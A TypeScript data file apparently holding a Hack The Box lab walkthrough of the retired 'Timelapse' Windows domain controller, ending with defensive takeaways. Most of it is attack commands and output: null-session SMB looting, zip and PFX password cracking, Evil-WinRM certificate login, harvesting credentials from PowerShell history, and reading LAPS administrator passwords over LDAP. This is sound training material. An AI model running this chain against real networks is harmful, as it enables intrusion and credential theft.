import type { WalkthroughDoc } from "./types";

export const timelapse: WalkthroughDoc = {
  slug: "timelapse",
  name: "Timelapse",
  platform: "Hack The Box",
  os: "Windows",
  difficulty: "Easy",
  retired: "Aug 2022",
  ip: "10.10.11.x",
  tags: [
    "Active Directory",
    "SMB null session",
    "zip2john",
    "pfx2john",
    "PFX cert auth",
    "Evil-WinRM",
    "PowerShell history",
    "LAPS",
  ],
  lede: "A domain controller that hands you the keys one archive at a time: an anonymous SMB share leaks a password-protected zip, the zip hides a PFX client certificate, the certificate logs us into WinRM-over-SSL, a PowerShell history file coughs up a service account, and that account can read the LAPS-managed local Administrator password straight out of AD.",
  summary: "Anonymous SMB yields a zip hiding a WinRM client cert; PowerShell history leaks a service account whose LAPS read rights expose the DC's local Administrator password.",
  sections: [
    {
      id: "overview",
      num: "00",
      title: "Overview",
      blocks: [
        { kind: "epigraph", text: "“The best time to rotate a secret was before you left it on an open share. The second best time is now.”" },
        { kind: "p", text: "**Timelapse** is an Easy-rated Windows machine, and a very honest one: it is a domain controller with no web surface at all, so the whole box is **Active Directory plus SMB**. The intended path is a tidy little relay race — each artefact you recover only exists to unlock the next one — and it doubles as a tour of certificate-based WinRM authentication and **LAPS** (the Local Administrator Password Solution)." },
        { kind: "p", text: "Nothing here is a memory-corruption CVE. It is a chain of realistic operational mistakes: an anonymously readable share, weak archive passwords, a private key stored in a backup, a plaintext credential in a shell history file, and an over-scoped LAPS read grant. Before we touch a single port, here is the full route from an unauthenticated scan to a shell on the DC:" },
        { kind: "h4", text: "Attack chain" },
        {
          kind: "ol",
          items: [
            "**recon** — nmap → AD DC, WinRM SSL-only on `5986`",
            "**SMB** — null session → `Shares\\Dev\\winrm_backup.zip`",
            "**zip2john** — crack zip → `legacyy_dev_auth.pfx`",
            "**pfx2john** — crack PFX → `cert.pem` + `key.pem`",
            "**Evil-WinRM -S** — cert auth as `legacyy` → `user.txt`",
            "**PSReadLine history** — leaks `svc_deploy` password",
            "**LAPS_Readers** — `svc_deploy` can read `ms-Mcs-AdmPwd`",
            "**crackmapexec laps** — DC local Administrator password",
            "**Evil-WinRM -S** — Administrator → `root.txt`",
          ],
        },
        { kind: "callout", variant: "note", title: "The HelpDesk hint", text: "Watch the SMB shares carefully. The `HelpDesk` folder ships the **LAPS installer and its documentation** — a deliberate breadcrumb that tells you, long before you get there, exactly how the final privilege escalation works. On this box the flavour is the hint." },
      ],
    },
    {
      id: "recon",
      num: "01",
      title: "Enumeration",
      blocks: [
        { kind: "h3", text: "Port scan" },
        { kind: "p", text: "We start with a full TCP sweep, then re-scan the open ports with service and script detection. The result is a textbook Windows domain-controller footprint — with one telling twist." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ nmap -p- --min-rate 10000 10.10.11.152",
            "$ nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389 10.10.11.152",
            "",
            "53/tcp   open  domain        Simple DNS Plus",
            "88/tcp   open  kerberos-sec  Microsoft Windows Kerberos",
            "135/tcp  open  msrpc         Microsoft Windows RPC",
            "139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn",
            "389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)",
            "445/tcp  open  microsoft-ds",
            "464/tcp  open  kpasswd5",
            "593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0",
            "636/tcp  open  ssl/ldap",
            "3268/tcp open  ldap",
            "3269/tcp open  ssl/ldap",
            "5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)",
            "| ssl-cert: Subject: commonName=dc01.timelapse.htb",
            "9389/tcp open  mc-nmf        .NET Message Framing",
          ],
          highlight: [13, 14],
        },
        { kind: "p", text: "The LDAP/Kerberos/SMB/GC stack confirms this is a DC. The domain is `timelapse.htb`, the host is `DC01`, and the OS is Windows Server 2019 (build 17763). The twist is at the top of the stack: there is **no WinRM on 5985** and **no HTTP on 80/443**. Instead WinRM is exposed *only over SSL* on `5986`, and the certificate on that port is issued to `commonName=dc01.timelapse.htb`. That SSL-only listener plus a certificate CN is the box quietly telling us that **certificate-based authentication** will matter later." },
        { kind: "p", text: "We seed our hosts file so name resolution and Kerberos behave." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ echo '10.10.11.152 timelapse.htb dc01.timelapse.htb dc01' | sudo tee -a /etc/hosts",
          ],
        },
        { kind: "callout", variant: "warn", title: "SSL-only WinRM — remember the -S flag", text: "Because WinRM lives on `5986` and not `5985`, every single Evil-WinRM invocation on this box needs the `-S` (SSL) flag. Leave it off and the connection simply fails. Also ignore the trailing `0` nmap prints in `timelapse.htb0.` — the real domain is `timelapse.htb`. And with no web service anywhere, do not waste an hour on directory fuzzing; this box is AD and SMB, full stop." },
      ],
    },
    {
      id: "smb",
      num: "02",
      title: "SMB — the anonymous Shares share",
      blocks: [
        { kind: "p", text: "With no web to chew on, SMB is the obvious first stop. The server permits a **null/guest session**, so we enumerate shares without credentials. Authenticating as `guest` with a blank password (or an outright anonymous session) both work." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ crackmapexec smb 10.10.11.152 -u 'guest' -p '' --shares",
            "$ smbmap -H 10.10.11.152 -u 'guest' -p ''",
            "",
            "  Shares          READ            ",
            "  ADMIN$          NO ACCESS       Remote Admin",
            "  C$              NO ACCESS       Default share",
            "  IPC$            READ            Remote IPC",
            "  NETLOGON        NO ACCESS       Logon server share",
            "  SYSVOL          NO ACCESS       Logon server share",
          ],
          highlight: [3],
        },
        { kind: "p", text: "Everything default is locked down, but there is a non-standard share called **`Shares`** we can read. We connect with a null session and walk it recursively." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ smbclient -N //10.10.11.152/Shares",
            "smb: \\> recurse ON",
            "smb: \\> ls",
            "  Dev",
            "  HelpDesk",
            "",
            "smb: \\Dev\\> ls",
            "  winrm_backup.zip",
            "",
            "smb: \\HelpDesk\\> ls",
            "  LAPS.x64.msi",
            "  LAPS_Datasheet.docx",
            "  LAPS_OperationsGuide.docx",
            "  LAPS_TechnicalSpecification.docx",
          ],
          highlight: [8],
        },
        { kind: "p", text: "Two folders, two stories. `Dev` holds a single password-protected archive, `winrm_backup.zip` — the name practically screams *WinRM authentication material*, which lines up perfectly with the SSL-only listener from recon. `HelpDesk` holds the **LAPS installer and its full documentation set**. We grab the archive and file away the LAPS folder as the privesc hint it plainly is." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "smb: \\Dev\\> get winrm_backup.zip",
          ],
        },
        { kind: "callout", variant: "key", title: "Recovered", text: "`Shares\\Dev\\winrm_backup.zip` — a ~2.6 KB password-protected zip, pulled over a null session. Plus the `HelpDesk` **LAPS** artefacts, which foreshadow the final privilege-escalation path." },
      ],
    },
    {
      id: "crack-zip",
      num: "03",
      title: "Cracking winrm_backup.zip",
      blocks: [
        { kind: "p", text: "The archive is encrypted, so we cannot list its contents blind. We convert it to a John-crackable hash with `zip2john` and throw `rockyou.txt` at it. The password falls almost instantly." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ zip2john winrm_backup.zip > zip.hash",
            "# ver 2.0 ... winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683",
            "",
            "$ john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt",
            "$ john zip.hash --show",
            "winrm_backup.zip:supremelegacy",
          ],
          highlight: [5],
        },
        { kind: "p", text: "Notice the hash line already leaks the archive's single member: `legacyy_dev_auth.pfx`. We extract it with the recovered password." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ 7z x winrm_backup.zip        # or: unzip winrm_backup.zip",
            "  Enter password: supremelegacy",
            "$ ls",
            "legacyy_dev_auth.pfx",
          ],
        },
        { kind: "p", text: "A `.pfx` is a **PKCS#12** bundle — a certificate packaged together with its private key. Given the WinRM-over-SSL service and the file name, this is almost certainly a *client certificate* for user **legacyy**, ready to be used for certificate-based WinRM auth. There is just one catch: the PFX is protected by its own, separate password." },
        { kind: "callout", variant: "key", title: "Recovered", text: "Zip password `supremelegacy`, yielding `legacyy_dev_auth.pfx`. The file name hands us the target user: **legacyy**." },
      ],
    },
    {
      id: "crack-pfx",
      num: "04",
      title: "Cracking the PFX and extracting the key",
      blocks: [
        { kind: "p", text: "The PFX is encrypted under a *second, different* password. We convert it to a hash with `pfx2john` and crack it the same way. One gotcha worth flagging up front: some packaged builds of `pfx2john` choke on this file's PKCS#12 format, so the reliable move is the standalone Python script." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "# use the python pfx2john if your packaged one errors on the PFX format",
            "$ wget https://raw.githubusercontent.com/sirrushoo/python/master/pfx2john.py",
            "$ python3 pfx2john.py legacyy_dev_auth.pfx > pfx.hash",
            "",
            "$ john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt",
            "$ john pfx.hash --show",
            "legacyy_dev_auth.pfx:thuglegacy",
          ],
          highlight: [6],
        },
        { kind: "p", text: "With the import password in hand, we use `openssl` to split the bundle into the two PEM files Evil-WinRM expects: the certificate on its own, and the *unencrypted* private key. The `-nodes` flag on the key export is critical — without it the key stays encrypted and Evil-WinRM cannot load it." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes",
            "  Enter Import Password: thuglegacy",
            "$ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys  -out cert.pem",
            "  Enter Import Password: thuglegacy",
            "$ ls",
            "cert.pem  key.pem",
          ],
        },
        { kind: "callout", variant: "warn", title: "Two things that trip people up", text: "**1.** Export the key with `-nodes`, or it remains password-protected and WinRM auth silently fails. **2.** On very new OpenSSL 3.x the older PKCS#12 algorithm may be refused — add `-legacy` (or `-provider legacy`) to `openssl` if the import errors out." },
        { kind: "callout", variant: "key", title: "Recovered", text: "PFX password `thuglegacy`. Split into `cert.pem` (legacyy's public certificate) and `key.pem` (legacyy's private key, unencrypted) — a complete WinRM client credential, no password required." },
      ],
    },
    {
      id: "foothold",
      num: "05",
      title: "Foothold — WinRM-over-SSL with the client cert",
      blocks: [
        { kind: "p", text: "WinRM on `5986` accepts **certificate-based authentication**. We point Evil-WinRM at the DC with `-S` for SSL, `-c cert.pem` for the certificate, and `-k key.pem` for the private key. The certificate *is* the credential — there is no password to supply — and it maps to its owner, `timelapse\\legacyy`." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S",
            "",
            "*Evil-WinRM* PS C:\\Users\\legacyy\\Documents> whoami",
            "timelapse\\legacyy",
          ],
          highlight: [3],
        },
        { kind: "callout", variant: "warn", title: "Order matters", text: "The `-S` flag is mandatory here — WinRM is SSL-only. And keep the flags straight: `-c` is the *certificate*, `-k` is the *private key*. Swap them and authentication fails with an unhelpful error." },
      ],
    },
    {
      id: "user",
      num: "06",
      title: "user.txt",
      blocks: [
        { kind: "p", text: "We are `legacyy`, an ordinary domain user. The first flag is sitting on their desktop." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "*Evil-WinRM* PS C:\\Users\\legacyy\\Documents> type ..\\Desktop\\user.txt",
            "76a8fc64····························",
          ],
          highlight: [1],
        },
        { kind: "p", text: "A foothold, nothing more. legacyy has no obvious privileges, so we pivot to local enumeration — and on Windows the very first place to look for a developer's forgotten secrets is their PowerShell history." },
      ],
    },
    {
      id: "history",
      num: "07",
      title: "Lateral movement — PowerShell history leaks svc_deploy",
      blocks: [
        { kind: "p", text: "PSReadLine records every interactive PowerShell command a user runs into a persistent history file, and it survives across sessions. Operators routinely paste credentials into a console without a second thought, so `ConsoleHost_history.txt` is one of the highest-value loot locations on any Windows foothold. legacyy's is no exception." },
        {
          kind: "code",
          lang: "powershell",
          lines: [
            "*Evil-WinRM* PS C:\\> type C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
            "",
            "$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck",
            "$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force",
            "$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)",
            "invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -ScriptBlock {whoami}",
          ],
          highlight: [3, 4],
        },
        { kind: "p", text: "There it is in cleartext: a previous operator built a `PSCredential` for the service account **svc_deploy** and used it to run commands over WinRM/SSL against localhost. That hands us svc_deploy's password verbatim." },
        { kind: "callout", variant: "key", title: "Recovered", text: "`svc_deploy : E3R$Q62^12p7PLlC%KWaxuaV`, lifted straight from legacyy's PSReadLine history. Because it contains `$`, `^` and `%`, always single-quote it in bash and PowerShell so the shell does not mangle it." },
      ],
    },
    {
      id: "laps-readers",
      num: "08",
      title: "Enumerating svc_deploy — LAPS_Readers",
      blocks: [
        { kind: "p", text: "A new credential means new enumeration. We check svc_deploy's group memberships — and this is where the `HelpDesk` LAPS breadcrumb from way back in SMB enum finally pays off." },
        {
          kind: "code",
          lang: "powershell",
          lines: [
            "*Evil-WinRM* PS C:\\> net user svc_deploy",
            "",
            "Global Group memberships     *Domain Users         *LAPS_Readers",
            "",
            "# optionally map it out with BloodHound from the svc_deploy context:",
            "$ bloodhound-python -d timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -c all -ns 10.10.11.152",
          ],
          highlight: [2],
        },
        { kind: "p", text: "svc_deploy sits in **LAPS_Readers**. LAPS stores each machine's randomised local Administrator password in a confidential AD attribute — `ms-Mcs-AdmPwd` — on the computer object, and only principals granted an explicit read ACL can see it. `LAPS_Readers` holds exactly that grant. In other words, svc_deploy can read the DC's local Administrator password straight out of LDAP." },
        { kind: "callout", variant: "note", title: "Why this is the whole game", text: "A normal domain user cannot read `ms-Mcs-AdmPwd` — it is a confidential attribute gated by a specific ACL. `LAPS_Readers` is that ACL. Because this machine *is* the domain controller, its local Administrator is effectively domain-admin-equivalent, so reading one attribute is game over." },
      ],
    },
    {
      id: "laps-read",
      num: "09",
      title: "Privesc — reading the LAPS Administrator password",
      blocks: [
        { kind: "p", text: "Using svc_deploy's credentials, we read `ms-Mcs-AdmPwd` off the `DC01` computer object over LDAP. The tidiest path is CrackMapExec's `laps` module, but the same read works with `pyLAPS.py`, a raw `ldapsearch`, or a PowerShell `Get-ADComputer` call from svc_deploy's context — anything that can query LDAP as an authorised reader." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ crackmapexec ldap dc01.timelapse.htb -d timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' --module laps",
            "LAPS  Getting LAPS Passwords",
            "LAPS  Computer: DC01$   User: Administrator   Password: <randomized local admin pw>",
            "",
            "# equivalent read paths:",
            "$ python3 pyLAPS.py --action get -u 'svc_deploy' -d 'timelapse.htb' -p 'E3R$Q62^12p7PLlC%KWaxuaV' --dc-ip 10.10.11.152",
            "$ ldapsearch -x -H ldap://10.10.11.152 -D 'svc_deploy@timelapse.htb' -w 'E3R$Q62^12p7PLlC%KWaxuaV' \\",
            "    -b 'dc=timelapse,dc=htb' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd",
          ],
          highlight: [2],
        },
        { kind: "p", text: "The module returns the current local Administrator password for `DC01`. That single confidential attribute is the last link in the chain." },
        { kind: "callout", variant: "warn", title: "The LAPS password rotates", text: "Do not hardcode the recovered value or bake it into a script — LAPS rotates the password on a schedule, and the machine resets independently. If a later login fails, simply re-read `ms-Mcs-AdmPwd` to get the current one." },
        { kind: "callout", variant: "key", title: "Recovered", text: "The DC's **local Administrator** password, read from `ms-Mcs-AdmPwd` on `CN=DC01`. On a domain controller, local Administrator is effectively the top of the tree." },
      ],
    },
    {
      id: "root",
      num: "10",
      title: "root.txt",
      blocks: [
        { kind: "p", text: "We log back into WinRM-over-SSL, this time as `Administrator` with the LAPS password, and we own the domain controller." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ evil-winrm -i 10.10.11.152 -u administrator -p '<LAPS_admin_password>' -S",
            "",
            "*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami",
            "timelapse\\administrator",
          ],
          highlight: [3],
        },
        { kind: "p", text: "One last piece of misdirection: the root flag is *not* on the Administrator desktop. It lives in another admin profile, `TRX`, which we can now read freely." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "*Evil-WinRM* PS C:\\> type C:\\Users\\TRX\\Desktop\\root.txt",
            "a1b2c3d4····························",
          ],
          highlight: [1],
        },
        { kind: "callout", variant: "warn", title: "root.txt lives under TRX, not Administrator", text: "New players burn time looking for `root.txt` under `C:\\Users\\Administrator` and get confused when it is not there — it is at `C:\\Users\\TRX\\Desktop\\root.txt`. And if the Administrator login ever fails, the LAPS password has simply rotated; re-read the attribute and try again." },
      ],
    },
    {
      id: "defense",
      num: "11",
      title: "Defensive takeaways",
      blocks: [
        {
          kind: "ul",
          items: [
            "**Never store credential material on open shares.** A single anonymously-readable `winrm_backup.zip` leaked the entire foothold. Lock down share ACLs and disable null/guest SMB sessions — a certificate bundle should never live on a share a null session can read.",
            "**Enforce strong passphrases on archives and PFX exports.** `supremelegacy` and `thuglegacy` fell to `rockyou.txt` in seconds. Private keys belong in a secrets vault, not a password-protected zip on a file server.",
            "**Clear PowerShell history for privileged workflows.** `ConsoleHost_history.txt` handed over svc_deploy's cleartext password. Disable or scrub PSReadLine history for service and admin accounts, and never build a `PSCredential` from a plaintext literal in an interactive console.",
            "**Scope LAPS read rights tightly.** svc_deploy in `LAPS_Readers` could read the DC's local Administrator password over LDAP. Grant `ms-Mcs-AdmPwd` read only to specific tiered admin accounts, and alert on LDAP reads of that attribute.",
            "**Get certificate auth right.** A stolen client certificate is full user access with no password to change. Track certificate issuance, protect private keys, and revoke exposed certs immediately.",
            "**Treat a DC's local Administrator as domain-critical.** On a domain controller, local admin is effectively domain admin — wrap detection (LDAP query alerting, WinRM logon monitoring) around it and assume any exposure is total.",
          ],
        },
        { kind: "callout", variant: "note", title: "Skills exercised", text: "AD recon · null-session SMB enumeration · zip2john / pfx2john cracking · PKCS#12 key extraction with OpenSSL · certificate-based WinRM-over-SSL auth · PowerShell history looting · LAPS abuse via LAPS_Readers · reading ms-Mcs-AdmPwd for a full DC compromise." },
      ],
    },
  ],
};
